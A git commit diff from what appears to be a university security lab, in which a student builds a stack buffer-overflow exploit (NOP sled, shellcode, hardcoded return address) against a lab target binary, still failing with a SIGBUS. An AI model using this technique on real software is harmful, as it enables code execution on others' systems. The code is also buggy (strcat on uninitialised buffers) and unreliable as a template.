7c1e8f69689516ef610c07aed910fd03f094385f
Yi Li  Ng <ngyi4@remote.ecf.utoronto.ca>
2024-02-04 00:14:56 -0500

    sploit 2 ret address overwritten but sigbus error

--- lab1/sploits/sploit2.c
+++ lab1/sploits/sploit2.c
@@ -10,13 +10,35 @@ int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
-	char *	env[1];
+	char *	env[2];
 
+	// memory address between buff and len
+	char buffer[400];
+	char *nop = "\x90";
+	char *newLen = "\x4c\x01";							 // distance between ret and buff 328+4
+
+	for (int i = 0; i < 213; i++)
+		strcat(buffer, nop);
+	strcat(buffer, shellcode);
+	strcat(buffer, newLen);
+
+	char return_addr[] = "\x80\xfd\x21\x30"; // addr of buff
+	char *newI = "\x0c\x01";
+
+	// memory address between i and return address
+	char gap[500];
+	strcat(gap, newI);
+	for (int i = 0; i < 52; i++)  // distance between i and ret
+		strcat(gap, nop);
+	strcat(gap, return_addr);
+
+	// arguments and envs
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = buffer;
 	args[2] = NULL;
 
-	env[0] = NULL;
+	env[0] = "";
+	env[1] = gap;
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
